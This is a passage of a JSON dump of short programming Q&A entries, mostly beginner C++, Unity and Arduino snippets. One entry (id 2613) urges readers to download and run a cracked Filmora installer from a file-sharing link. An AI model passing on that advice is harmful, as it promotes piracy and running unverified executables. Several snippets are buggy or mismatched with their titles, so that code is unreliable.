    "description": "template<std::size_t SIZE> void mulArray(std::array<int, SIZE>& arr, const int multiplier) {     for(auto& e : arr) {         e *= multiplier;     } } \n",
    "reg_date": "2021-10-12T11:41:10.000Z"
  },
  {
    "id": 2580,
    "keyword": null,
    "link": null,
    "title": " how to play sounds in c++",
    "description": "PlaySound(TEXT(\"sound.wav\"), NULL, SND_FILENAME);\n",
    "reg_date": "2021-10-12T11:41:10.000Z"
  },
  {
    "id": 2581,
    "keyword": null,
    "link": null,
    "title": " how to print 5 precision float in c++",
    "description": "#include <iostream> #include <cstdio> using namespace std;  int main()  {     // This code helps you to print a number with desired decimal     double Number=10.3454;     printf(\"%.3lf\",Number);      return 0; }\n",
    "reg_date": "2021-10-12T11:41:10.000Z"
  },
  {
    "id": 2582,
    "keyword": null,
    "link": null,
    "title": " how to print a decimal number upto 6 places of decimal in c++",
    "description": "#include <iostream> #include <iomanip>  int main() {     double d = 122.345;      std::cout << std::fixed;     std::cout << std::setprecision(2);     std::cout << d; }\n788.98 \n",
    "reg_date": "2021-10-12T11:41:10.000Z"
  },
  {
    "id": 2583,
    "keyword": null,
    "link": null,
    "title": " how to print a string to console in c++",
    "description": "// Just some basic format   #include <iostream> #include <string> using namespace std;  int main() {  cout << \"Print a String\" << endl;  }\n",
    "reg_date": "2021-10-12T11:41:10.000Z"
  },
  {
    "id": 2584,
    "keyword": null,
    "link": null,
    "title": " how to print a text in c++",
    "description": "std::cout << \" Something \";\n//typing using namespace std; before the int main will make things easier so that you  //won't need to type std:: every time you code something. // For example:  using namespace std;  int main() { \tcout << \"Hello World!\";  }\n",
    "reg_date": "2021-10-12T11:41:11.000Z"
  },
  {
    "id": 2585,
    "keyword": null,
    "link": null,
    "title": " how to print all numbers in an integer in c++",
    "description": "#include<iostream> using namespace std; void print_each_digit(unsigned long long int x) {     if(x >= 10)        print_each_digit(x / 10);      int digit = x % 10;      cout << digit << '\\n'; } int main(){ \tunsigned long long int i; \tcin >> i; \tprint_each_digit(i); \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:11.000Z"
  },
  {
    "id": 2586,
    "keyword": null,
    "link": null,
    "title": " how to print an array in cpp in single line",
    "description": "int Grades[5] = { 3, 2, 5, 2 };  cout << \"Grades: \"; for (int i = 0; i < sizeof(Grades)/sizeof(int); i++) {     cout << Grades[i] << \", \"; //minus the commas, remove (<< \", \") or to space out the grades, just remove the comma } \n",
    "reg_date": "2021-10-12T11:41:11.000Z"
  },
  {
    "id": 2587,
    "keyword": null,
    "link": null,
    "title": " how to print double value up to 9 decimal places in c++",
    "description": "#include <iostream> #include <iomanip>  int main() {     double d = 122.345;      std::cout << std::fixed;     std::cout << std::setprecision(2);     std::cout << d; }\n192.22222543 \n",
    "reg_date": "2021-10-12T11:41:11.000Z"
  },
  {
    "id": 2588,
    "keyword": null,
    "link": null,
    "title": " how to print fixed places after decimal point in c++",
    "description": " cout << fixed << setprecision(n)<<variable; //n is number of places needed after decimal point\n",
    "reg_date": "2021-10-12T11:41:11.000Z"
  },
  {
    "id": 2589,
    "keyword": null,
    "link": null,
    "title": " how to print hello world in c++",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n#include <iostream> using namespace std;  int main() {  \tcout << \"Hello World\\n\";   \treturn 0; }\n#include<iostream> using std::cout;  int main(){     cout << \"Hello World\";     return 0; }\n#include <bits/stdc++.h>  using namespace std;  int main(){ \tcout << \"hello world! \\n\";  }                                                     //code by goukl aakash\n #include<iostream>   using namespace std;  int main() {     cout<<\"Hello World\";           return 0; }\n",
    "reg_date": "2021-10-12T11:41:11.000Z"
  },
  {
    "id": 2590,
    "keyword": null,
    "link": null,
    "title": " how to print in c++",
    "description": "#include <iostream>  int main() {   std::cout << \"Hello, World!\"; // prints 'Hello, World!' to the output.   return 0; }\n#include <iostream> using namespace std;  int main(){   cout<<\"Hello World!\"<< endl; // prints \"Hello World\"   return 0; }\nstd::cout << \"\";\n#include <iostream> using namespace std;  int main() {   cout << \"me\";   return 0; } \n#include <iostream> std::cout << someString << \"\\n\"; \n#include <iostream> using namespace std;  int main() {   cout << \"ENTER TEXT HERE\";   return 0; } \n",
    "reg_date": "2021-10-12T11:41:11.000Z"
  },
  {
    "id": 2591,
    "keyword": null,
    "link": null,
    "title": " how to print in new lines in  C++",
    "description": "cout<<\"\\n\"; or cout<<endl;\n#include<iostream.h> void main() {   cout<<\"First Line\\n\";   cout<<\"Next Line\"; }\n",
    "reg_date": "2021-10-12T11:41:11.000Z"
  },
  {
    "id": 2592,
    "keyword": null,
    "link": null,
    "title": " how to print integer in c++",
    "description": "#include <iostream> using namespace std;  int main() {         int number;      cout << \"Enter an integer: \";     cin >> number;      cout << \"You entered \" << number;         return 0; }\n",
    "reg_date": "2021-10-12T11:41:11.000Z"
  },
  {
    "id": 2593,
    "keyword": null,
    "link": null,
    "title": " how to print items in arduino",
    "description": "void setup() {   Serial.begin(9600); // begin Serial communication }  void loop() {   Serial.print(\"your text\"); // print text   Serial.print(your_variable); // print a variable   Serial.print(\"\\n\"); // print a new line }\n",
    "reg_date": "2021-10-12T11:41:11.000Z"
  },
  {
    "id": 2594,
    "keyword": null,
    "link": null,
    "title": " how to print items in c++",
    "description": "debug(\"your text\"); // print text debug(your_variable); // print a variable degubln(\"\"); // print a new line\n",
    "reg_date": "2021-10-12T11:41:12.000Z"
  },
  {
    "id": 2595,
    "keyword": null,
    "link": null,
    "title": " how to print list in c++",
    "description": "#include <iostream> #include <list>  std::list<int> listOfNumbers = {1, 2, 3, 4};  for (int item : listOfNumbers)   std::cout << item << \" \"; \n",
    "reg_date": "2021-10-12T11:41:12.000Z"
  },
  {
    "id": 2596,
    "keyword": null,
    "link": null,
    "title": " how to print nth palindrome number in c++",
    "description": " int n;     int count =0;     while(true){         cin>> n;         if (n == 0) return 0;                  if( n <= 10000){         for( int i=1 ; i <= 2000000000; i++){                  if( palindrom(i) == true) {                     count++;                     //cout << \"palindrom : \" << i<< \" count : \" << count <<endl;                                                       if( count == n ) {                                              cout << i <<endl;                                             count =0;                         break;                     } \n if(n <=1000 && i==0){                // cout << \" here \"<<endl;                 count =0;                 i=0;                // break;                              }else if( n >1000 && n <=2000 && i==0){                 //cout << \"there \" <<endl;                 count =1000;                 i=90109;                // break;             }else if( n >2000 && n <=2500 && i==0){                 //cout << \"there \" <<endl;                 count =2000;                 i=1001001;                 // break;             }else if( n >2500 && n <=3000 && i==0){                 //cout << \"there \" <<endl;                 count =2500;                 i=1501051;                 // break;  \n",
    "reg_date": "2021-10-12T11:41:12.000Z"
  },
  {
    "id": 2597,
    "keyword": null,
    "link": null,
    "title": " how to print numbers with only 2 digits after decimal point in c++",
    "description": "#include <cstdio> #include <iostream>  int main() {     double total;     cin>>total;     printf(\"%.2f\\n\", total);      //one can use the C function to print the decimal points }\n#include <iostream> #include <iomanip> #include <iostream> ​ int main() { \tdouble d = 122.345; \tcout << fixed << setprecision(2) << d;   \t//the setprecision can vary as per required }\n",
    "reg_date": "2021-10-12T11:41:12.000Z"
  },
  {
    "id": 2598,
    "keyword": null,
    "link": null,
    "title": " how to print to the serial monitor arduino",
    "description": "void setup() {     Serial.begin( 9600 ); }  void loop() {     // This will write to the monitor and end the line     Serial.println( \"test text\" );        // This will write to the monitor but will not end the line     Serial.print( \"test text\" ); } \n",
    "reg_date": "2021-10-12T11:41:12.000Z"
  },
  {
    "id": 2599,
    "keyword": null,
    "link": null,
    "title": " how to print with the bool value in cpp",
    "description": "#include <iostream> #include <iomanip>  int main() {     std::cout<<false<<\"\\n\";     std::cout << std::boolalpha;        std::cout<<false<<\"\\n\";     return 0; } \n",
    "reg_date": "2021-10-12T11:41:12.000Z"
  },
  {
    "id": 2600,
    "keyword": null,
    "link": null,
    "title": " how to print x number of bytes cout",
    "description": "#include <iostream> #include <cstring>  #define x 4  int main() {   const char* str = \"1234567890\";   char temp[x+1] = {0};      std::memcopy(temp, str, x);      std::cout << temp << std::endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:41:12.000Z"
  },
  {
    "id": 2601,
    "keyword": null,
    "link": null,
    "title": " how to pronounce beaucoup",
    "description": "bow . Koo\n",
    "reg_date": "2021-10-12T11:41:12.000Z"
  },
  {
    "id": 2602,
    "keyword": null,
    "link": null,
    "title": " how to put bitset into a string in c++",
    "description": "#include <iostream> #include <bitset> int main() {     std::bitset<8> b(42);     std::cout << b.to_string() << '\\n'               << b.to_string('*') << '\\n'               << b.to_string('O', 'X') << '\\n'; }\n",
    "reg_date": "2021-10-12T11:41:12.000Z"
  },
  {
    "id": 2603,
    "keyword": null,
    "link": null,
    "title": " how to put emojis in c++",
    "description": "/* C++ Program - Print Smiling Face on Screen */ \t\t #include<iostream.h> #include<conio.h> void main() { \tclrscr(); \tint sml=1, i, limit; \tchar ch=sml; \tcout<<\"How many smiley face you want to print ? \"; \tcin>>limit; \tfor(i=0; i<limit; i++) \t{ \t\tcout<<ch<<\" \"; \t} \tgetch(); }\n",
    "reg_date": "2021-10-12T11:41:12.000Z"
  },
  {
    "id": 2604,
    "keyword": null,
    "link": null,
    "title": " how to put string in array c++",
    "description": "{     string word;     ArrayWithWords[d] = word;     d++; } \n",
    "reg_date": "2021-10-12T11:41:13.000Z"
  },
  {
    "id": 2605,
    "keyword": null,
    "link": null,
    "title": " how to put your name on c ++",
    "description": "#include <iostream> using namespace std;  #define MAX_LENGTH 100  int main() { \tchar name[MAX_LENGTH]={0}; \tint age; \t \tcout<<\"Enter name of the person: \"; \tcin.getline(name,MAX_LENGTH); \tcout<<\"Enter age: \"; \tcin>>age; \t \tcout<<\"Name: \"<<name<<endl; \tcout<<\"Age: \"<<age<<endl; \t \treturn 0; } \n",
    "reg_date": "2021-10-12T11:41:13.000Z"
  },
  {
    "id": 2606,
    "keyword": null,
    "link": null,
    "title": " how to read a comma delimited file into an array c++",
    "description": "#include <fstream> #include <sstream> #include <iostream> #include <vector>  int main() {     std::ifstream inFile(\"registration.txt\");     if (inFile.is_open())     {         std::string line;         while( std::getline(inFile,line) )         {             std::stringstream ss(line);              std::string ID, fname, lname;             std::getline(ss,ID,',');    std::cout<<\"\\\"\"<<ID<<\"\\\"\";             std::getline(ss,fname,','); std::cout<<\", \\\"\"<<fname<<\"\\\"\";             std::getline(ss,lname,','); std::cout<<\", \\\"\"<<lname<<\"\\\"\";              std::vector<std::string> enrolled;             std::string course;             while( std::getline(ss,course,',') )             {                  enrolled.push_back(course); std::cout<<\", \\\"\"<<course<<\"\\\"\";             }             std::cout<<\"\\n\";         }     }     return 0; }\n",
    "reg_date": "2021-10-12T11:41:13.000Z"
  },
  {
    "id": 2607,
    "keyword": null,
    "link": null,
    "title": " how to read a line from the console in c++",
    "description": "#include <string> std::string str; std::getline(std::cin, str); // The output of std::getline(std::cin, str) will be stored in str.\n",
    "reg_date": "2021-10-12T11:41:13.000Z"
  },
  {
    "id": 2608,
    "keyword": null,
    "link": null,
    "title": " how to read and parse a json file with rapidjson",
    "description": "FILE *fp = fopen(\"input.json\", \"r\"); // stupid windows need rb     char buf[0XFFFF];       //FileReadStream(FILE *fp, char *buffer, std::size_t bufferSize)     rapidjson::FileReadStream input(fp, buf, sizeof(buf));     rapidjson::Document document;     document.ParseStream(input);     fclose(fp);  \tcout << document[\"hello\"].GetString() << endl;\n",
    "reg_date": "2021-10-12T11:41:13.000Z"
  },
  {
    "id": 2609,
    "keyword": null,
    "link": null,
    "title": " how to read and write in a file c++",
    "description": "// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n#include <iostream> #include <fstream> using namespace std;  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\n",
    "reg_date": "2021-10-12T11:41:13.000Z"
  },
  {
    "id": 2610,
    "keyword": null,
    "link": null,
    "title": " how to read wav file in C++",
    "description": "#include <iostream> #include <string> #include <fstream> #include <cstdint>  using std::cin; using std::cout; using std::endl; using std::fstream; using std::string;  typedef struct  WAV_HEADER {     /* RIFF Chunk Descriptor */     uint8_t         RIFF[4];        // RIFF Header Magic header     uint32_t        ChunkSize;      // RIFF Chunk Size     uint8_t         WAVE[4];        // WAVE Header     /* \"fmt\" sub-chunk */     uint8_t         fmt[4];         // FMT header     uint32_t        Subchunk1Size;  // Size of the fmt chunk     uint16_t        AudioFormat;    // Audio format 1=PCM,6=mulaw,7=alaw,     257=IBM Mu-Law, 258=IBM A-Law, 259=ADPCM     uint16_t        NumOfChan;      // Number of channels 1=Mono 2=Sterio     uint32_t        SamplesPerSec;  // Sampling Frequency in Hz     uint32_t        bytesPerSec;    // bytes per second     uint16_t        blockAlign;     // 2=16-bit mono, 4=16-bit stereo     uint16_t        bitsPerSample;  // Number of bits per sample     /* \"data\" sub-chunk */     uint8_t         Subchunk2ID[4]; // \"data\"  string     uint32_t        Subchunk2Size;  // Sampled data length } wav_hdr;  // Function prototypes int getFileSize(FILE* inFile);  int main(int argc, char* argv[]) {     wav_hdr wavHeader;     int headerSize = sizeof(wav_hdr), filelength = 0;      const char* filePath;     string input;     if (argc <= 1)     {         cout << \"Input wave file name: \";         cin >> input;         cin.get();         filePath = input.c_str();     }     else     {         filePath = argv[1];         cout << \"Input wave file name: \" << filePath << endl;     }      FILE* wavFile = fopen(filePath, \"r\");     if (wavFile == nullptr)     {         fprintf(stderr, \"Unable to open wave file: %s\\n\", filePath);         return 1;     }      //Read the header     size_t bytesRead = fread(&wavHeader, 1, headerSize, wavFile);     cout << \"Header Read \" << bytesRead << \" bytes.\" << endl;     if (bytesRead > 0)     {         //Read the data         uint16_t bytesPerSample = wavHeader.bitsPerSample / 8;      //Number     of bytes per sample         uint64_t numSamples = wavHeader.ChunkSize / bytesPerSample; //How many samples are in the wav file?         static const uint16_t BUFFER_SIZE = 4096;         int8_t* buffer = new int8_t[BUFFER_SIZE];         while ((bytesRead = fread(buffer, sizeof buffer[0], BUFFER_SIZE / (sizeof buffer[0]), wavFile)) > 0)         {             /** DO SOMETHING WITH THE WAVE DATA HERE **/             cout << \"Read \" << bytesRead << \" bytes.\" << endl;         }         delete [] buffer;         buffer = nullptr;         filelength = getFileSize(wavFile);          cout << \"File is                    :\" << filelength << \" bytes.\" << endl;         cout << \"RIFF header                :\" << wavHeader.RIFF[0] << wavHeader.RIFF[1] << wavHeader.RIFF[2] << wavHeader.RIFF[3] << endl;         cout << \"WAVE header                :\" << wavHeader.WAVE[0] << wavHeader.WAVE[1] << wavHeader.WAVE[2] << wavHeader.WAVE[3] << endl;         cout << \"FMT                        :\" << wavHeader.fmt[0] << wavHeader.fmt[1] << wavHeader.fmt[2] << wavHeader.fmt[3] << endl;         cout << \"Data size                  :\" << wavHeader.ChunkSize << endl;          // Display the sampling Rate from the header         cout << \"Sampling Rate              :\" << wavHeader.SamplesPerSec << endl;         cout << \"Number of bits used        :\" << wavHeader.bitsPerSample << endl;         cout << \"Number of channels         :\" << wavHeader.NumOfChan << endl;         cout << \"Number of bytes per second :\" << wavHeader.bytesPerSec << endl;         cout << \"Data length                :\" << wavHeader.Subchunk2Size << endl;         cout << \"Audio Format               :\" << wavHeader.AudioFormat << endl;         // Audio format 1=PCM,6=mulaw,7=alaw, 257=IBM Mu-Law, 258=IBM A-Law, 259=ADPCM          cout << \"Block align                :\" << wavHeader.blockAlign << endl;         cout << \"Data string                :\" << wavHeader.Subchunk2ID[0] << wavHeader.Subchunk2ID[1] << wavHeader.Subchunk2ID[2] << wavHeader.Subchunk2ID[3] << endl;     }     fclose(wavFile);     return 0; }  // find the file size int getFileSize(FILE* inFile) {     int fileSize = 0;     fseek(inFile, 0, SEEK_END);      fileSize = ftell(inFile);      fseek(inFile, 0, SEEK_SET);     return fileSize; } \n",
    "reg_date": "2021-10-12T11:41:13.000Z"
  },
  {
    "id": 2611,
    "keyword": null,
    "link": null,
    "title": " how to reference a child gameobject unity",
    "description": "    private void Start()     {         parentObject = GameObject.Find(\"Parent\");// The name of the parent object         childObject = parentObject.transform.GetChild(0).gameObject; // the parent index (starting from 0)     }\n//For unity engine GameObject.transform.GetChild(The child index).transform;\nTransform[] transforms = this.GetComponentsInChildren<Transform>();    foreach(Transform t in transforms)  {      if (t.gameObject.name == \"Child\")      {          Debug.Log (\"Found \" + t);      }  }\n\t\t// spawns object         objToSpawn = new GameObject(\"Start\");          // add Components         objToSpawn.AddComponent<Rigidbody>();         objToSpawn.AddComponent<MeshFilter>();         objToSpawn.AddComponent<BoxCollider>();         objToSpawn.AddComponent<MeshRenderer>();          // sets the obj's parent to the obj that the script is applied to         objToSpawn.transform.SetParent(this.transform);\n",
    "reg_date": "2021-10-12T11:41:13.000Z"
  },
  {
    "id": 2612,
    "keyword": null,
    "link": null,
    "title": " how to remove an element from a vector by value c++",
    "description": "#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\nstd::vector<int> v;  // fill it up somehow v.erase(std::remove(v.begin(), v.end(), 99), v.end());  // really remove all elements with value 99\nvector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \n#include<bits/stdc++.h> using namespace std; int main(){     vector<int> v;     //Insert values 1 to 10     v.push_back(20);     v.push_back(10);     v.push_back(30);     v.push_back(20);     v.push_back(40);     v.push_back(20);     v.push_back(10);      vector<int>::iterator new_end;     new_end = remove(v.begin(), v.end(), 20);      for(int i=0;i<v.size(); i++){         cout << v[i] << \" \";     }     //Prints [10 30 40 10]     return 0; } C++Copy\n",
    "reg_date": "2021-10-12T11:41:13.000Z"
  },
  {
    "id": 2613,
    "keyword": null,
    "link": null,
    "title": " how to remove filmora watermark for free",
    "description": "Download & Run This Crack File. It will setup the filmora X without watermark and with cool features. https://mega.nz/file/IgtkgLJa#1P1okBp_hsngbcBC7I-TXWbtjHoSvHNEPp7EphG6JKs\nthanks my dude it worked\n",
    "reg_date": "2021-10-12T11:41:14.000Z"
  },
  {
    "id": 2614,
    "keyword": null,
    "link": null,
    "title": " how to remove maximum number of characters in c++ cin,ignore",
    "description": "std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n",
    "reg_date": "2021-10-12T11:41:14.000Z"
  },
  {
    "id": 2615,
    "keyword": null,
    "link": null,
    "title": " how to remove middle element in vector c++",
    "description": "// Deletes the second element (vec[1]) vec.erase(vec.begin() + 1);  // Deletes the second through third elements (vec[1], vec[2]) vec.erase(vec.begin() + 1, vec.begin() + 3);\n1 2 3 4 5\n",
    "reg_date": "2021-10-12T11:41:14.000Z"
  },
  {
    "id": 2616,
    "keyword": null,
    "link": null,
    "title": " how to replace an element in array in c++",
    "description": "#include<iostream> #include<bits/stdc++.h> using namespace std; int main(){ \tint arr[3] = {0,1,2}; \tcout << \"Before update \"<<arr[2]<<endl; \tarr[2]=1;//updating element \tcout <<\"After update \"<<arr[2]<<endl; }  /*output:- Before update 2 After update 1*/\n",
    "reg_date": "2021-10-12T11:41:14.000Z"
  },
  {
    "id": 2617,
    "keyword": null,
    "link": null,
    "title": " how to reset linerenderer unity",
    "description": "LineRenderer.positionCount = 0; \n",
    "reg_date": "2021-10-12T11:41:14.000Z"
  },
  {
    "id": 2618,
    "keyword": null,
    "link": null,
    "title": " how to return 2d array from function c++",
    "description": " #include <cstdio>      // Returns a pointer to a newly created 2d array the array2D has size [height x width]      int** create2DArray(unsigned height, unsigned width)     {       int** array2D = 0;       array2D = new int*[height];            for (int h = 0; h < height; h++)       {             array2D[h] = new int[width];                  for (int w = 0; w < width; w++)             {                   // fill in some initial values                   // (filling in zeros would be more logic, but this is just for the example)                   array2D[h][w] = w + width * h;             }       }            return array2D;     }          int main()     {       printf(\"Creating a 2D array2D\\n\");       printf(\"\\n\");            int height = 15;       int width = 10;       int** my2DArray = create2DArray(height, width);       printf(\"Array sized [%i,%i] created.\\n\\n\", height, width);            // print contents of the array2D       printf(\"Array contents: \\n\");            for (int h = 0; h < height; h++)       {             for (int w = 0; w < width; w++)             {                   printf(\"%i,\", my2DArray[h][w]);             }             printf(\"\\n\");       }                // important: clean up memory           printf(\"\\n\");           printf(\"Cleaning up memory...\\n\");           for (int h = 0; h < height; h++) // loop variable wasn't declared           {             delete [] my2DArray[h];           }           delete [] my2DArray;           my2DArray = 0;           printf(\"Ready.\\n\");            return 0;     } \n",
    "reg_date": "2021-10-12T11:41:14.000Z"
  },
  {
    "id": 2619,
    "keyword": null,
    "link": null,
    "title": " how to return a vector c++",
    "description": "std::vector<x>f();\n",
    "reg_date": "2021-10-12T11:41:14.000Z"
  },
  {
    "id": 2620,
    "keyword": null,
    "link": null,
    "title": " how to return char* from function in c++",
    "description": "//Function declaration char* testfunc() {     char* str = malloc(10 * sizeof(char));     return str; }  //Calling the function foo = testfunc(); // Do something with your foo free(foo);\t\t//It is required to free() memory to avoid memory lead\n",
    "reg_date": "2021-10-12T11:41:14.000Z"
  },
  {
    "id": 2621,
    "keyword": null,
    "link": null,
    "title": " how to reverse a character array in c++",
    "description": "std::reverse(str, str + strlen(str));\n",
    "reg_date": "2021-10-12T11:41:14.000Z"
  },
  {
    "id": 2622,
    "keyword": null,
    "link": null,
    "title": " how to reverse a vector",
    "description": "",
    "reg_date": "2021-10-12T11:41:14.000Z"
  },
  {
    "id": 2623,
    "keyword": null,
    "link": null,
    "title": " how to rotate canvas android",
    "description": "canvas.save(); canvas.rotate(45); canvas.drawRect(166, 748, 314, 890, paint); canvas.restore();\n",
    "reg_date": "2021-10-12T11:41:15.000Z"
  },
  {
    "id": 2624,
    "keyword": null,
    "link": null,
    "title": " how to round to nearest whole number unity",
    "description": "        // Prints 10         Debug.Log(Mathf.Round(10.0f));          // Prints 10         Debug.Log(Mathf.Round(10.2f));          // Prints 11         Debug.Log(Mathf.Round(10.7f));\n",
    "reg_date": "2021-10-12T11:41:15.000Z"
  },
  {
    "id": 2625,
    "keyword": null,
    "link": null,
    "title": " how to run a c++ program in the background",
    "description": "HWND window; AllocConsole(); window = FindWindowA(\"ConsoleWindowClass\", NULL); ShowWindow(window,0);\n",
    "reg_date": "2021-10-12T11:41:15.000Z"
  },
  {
    "id": 2626,
    "keyword": null,
    "link": null,
    "title": " how to run a msi file raspbrain",
    "description": "sudo apt install --install-recommends winehq-stable \n",
    "reg_date": "2021-10-12T11:41:15.000Z"
  },
  {
    "id": 2627,
    "keyword": null,
    "link": null,
    "title": " how to run code in devcpp",
    "description": "First save the script  ctrl+s  Then press f10 to run the script \n",
    "reg_date": "2021-10-12T11:41:15.000Z"
  },
  {
    "id": 2628,
    "keyword": null,
    "link": null,
    "title": " how to run cpp code in vscode",
    "description": "g++ --version\n{     \"version\": \"0.1.0\",     \"command\": \"make\",     \"isShellCommand\": true,     \"tasks\": [         {             \"taskName\": \"Makefile\",              // Make this the default build command.             \"isBuildCommand\": true,              // Show the output window only if unrecognized errors occur.             \"showOutput\": \"always\",              // Pass 'all' as the build target             \"args\": [\"all\"],              // Use the standard less compilation problem matcher.             \"problemMatcher\": {                 \"owner\": \"cpp\",                 \"fileLocation\": [\"relative\", \"${workspaceRoot}\"],                 \"pattern\": {                     \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",                     \"file\": 1,                     \"line\": 2,                     \"column\": 3,                     \"severity\": 4,                     \"message\": 5                 }             }         }     ] } \n",
    "reg_date": "2021-10-12T11:41:15.000Z"
  },
  {
    "id": 2629,
    "keyword": null,
    "link": null,
    "title": " how to run cpp file ubuntu",
    "description": "g++ foo.cpp\nDOWNLOAD DEVC++ OR TURBOC++ IF IT CANT RUN , RUN IN VS CODE BY GIVING g++ foo.cpp IN TERMINAL .\n",
    "reg_date": "2021-10-12T11:41:15.000Z"
  },
  {
    "id": 2630,
    "keyword": null,
    "link": null,
    "title": " how to run cpp in ubuntu",
    "description": "g++ foo.cpp\nDOWNLOAD DEVC++ OR TURBOC++ IF IT CANT RUN , RUN IN VS CODE BY GIVING g++ foo.cpp IN TERMINAL .\n",
    "reg_date": "2021-10-12T11:41:15.000Z"
  },
  {
    "id": 2631,
    "keyword": null,
    "link": null,
    "title": " how to run cpp using gcc vscode",
    "description": "{     \"version\": \"0.1.0\",     \"command\": \"make\",     \"isShellCommand\": true,     \"tasks\": [         {             \"taskName\": \"Makefile\",              // Make this the default build command.             \"isBuildCommand\": true,              // Show the output window only if unrecognized errors occur.             \"showOutput\": \"always\",              // Pass 'all' as the build target             \"args\": [\"all\"],              // Use the standard less compilation problem matcher.             \"problemMatcher\": {                 \"owner\": \"cpp\",                 \"fileLocation\": [\"relative\", \"${workspaceRoot}\"],                 \"pattern\": {                     \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",                     \"file\": 1,                     \"line\": 2,                     \"column\": 3,                     \"severity\": 4,                     \"message\": 5                 }             }         }     ] } \n",
    "reg_date": "2021-10-12T11:41:15.000Z"
  },
  {
    "id": 2632,
    "keyword": null,
    "link": null,
    "title": " how to save data to a file in c++",
    "description": "// io/read-file-sum.cpp - Read integers from file and print sum. // Fred Swartz 2003-08-20  #include <iostream> #include <iomanip> #include <fstream> using namespace std;  int main() {     int sum = 0;     int x;     ifstream inFile;          inFile.open(\"test.txt\");     if (!inFile) {         cout << \"Unable to open file\";         exit(1); // terminate with error     }          while (inFile >> x) {         sum = sum + x;     }          inFile.close();     cout << \"Sum = \" << sum << endl;      return 0; } \nsddsdjksk\n",
    "reg_date": "2021-10-12T11:41:15.000Z"
  },
  {
    "id": 2633,
    "keyword": null,
    "link": null,
    "title": " how to save system function output into a variable in c++",
    "description": "#include <windows.h> #include <atlstr.h> // // Execute a command and get the results. (Only standard output) // CStringA ExecCmd(     const wchar_t* cmd              // [in] command to execute ) {     CStringA strResult;     HANDLE hPipeRead, hPipeWrite;      SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES)};     saAttr.bInheritHandle = TRUE; // Pipe handles are inherited by child process.     saAttr.lpSecurityDescriptor = NULL;      // Create a pipe to get results from child's stdout.     if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))         return strResult;      STARTUPINFOW si = {sizeof(STARTUPINFOW)};     si.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;     si.hStdOutput  = hPipeWrite;     si.hStdError   = hPipeWrite;     si.wShowWindow = SW_HIDE; // Prevents cmd window from flashing.                               // Requires STARTF_USESHOWWINDOW in dwFlags.      PROCESS_INFORMATION pi = { 0 };      BOOL fSuccess = CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);     if (! fSuccess)     {         CloseHandle(hPipeWrite);         CloseHandle(hPipeRead);         return strResult;     }      bool bProcessEnded = false;     for (; !bProcessEnded ;)     {         // Give some timeslice (50 ms), so we won't waste 100% CPU.         bProcessEnded = WaitForSingleObject( pi.hProcess, 50) == WAIT_OBJECT_0;          // Even if process exited - we continue reading, if         // there is some data available over pipe.         for (;;)         {             char buf[1024];             DWORD dwRead = 0;             DWORD dwAvail = 0;              if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))                 break;              if (!dwAvail) // No data available, return                 break;              if (!::ReadFile(hPipeRead, buf, min(sizeof(buf) - 1, dwAvail), &dwRead, NULL) || !dwRead)                 // Error, the child process might ended                 break;              buf[dwRead] = 0;             strResult += buf;         }     } //for      CloseHandle(hPipeWrite);     CloseHandle(hPipeRead);     CloseHandle(pi.hProcess);     CloseHandle(pi.hThread);     return strResult; } //ExecCmd \n",
    "reg_date": "2021-10-12T11:41:16.000Z"
  },
  {
    "id": 2634,
    "keyword": null,
    "link": null,
    "title": " how to say hello world in c++",
    "description": "#include <iostream> int main(){ \tstd::cout << \"Hello World!\" << std::endl; }\ncout<<\"Hello, World!\"<<endl;\ncout<<\"Hello, World!<<endl;\n",
    "reg_date": "2021-10-12T11:41:16.000Z"
  },
  {
    "id": 2635,
    "keyword": null,
    "link": null,
    "title": " how to search integer  in c++",
    "description": "//******************************************************** // search algorithm for arrays //********************************************************  #include <iostream>  using namespace std;  void initializeArray(int list[], int listSize);\t\t\t\t int seqSearch(int list[], int listLength, int searchItem);\t\t void printArray(int list[], int listSize);\t\t\t\t\t\t\t\t \t int main() { \tint maximum = 10; \tint array[maximum]; \tint result; \tint input; \t \tcout << \"Enter number to search in array!\" << endl; \tcin >> input; \t \t// set all array elements to 1; \tinitializeArray(array, maximum); \tcout << \"before change\" << endl; \tprintArray(array, maximum); \t \t// change array element No. 7 to 0 \tarray[7] = 1; \tcout << \"after change\" << endl; \tprintArray(array, maximum); \t \t// search user input in array \tresult = seqSearch(array, maximum, input); \t \tif (result = -1) \t\tcout << \"Item not found!\" << endl; \telse \t\tcout << \"Item found at position: \" << result << \"!\" << endl; \t \treturn 0; }  int seqSearch(int list[], int listLength, int searchItem) { \tint loc; \tbool found = false; \t \tloc = 0; \t \twhile (loc < listLength && !found) \t\tif (list[loc] == searchItem) \t\t\tfound = true; \t\telse \t\t\tloc++; \t \tif (found) \t\treturn loc; \telse \t\treturn -1; }  void 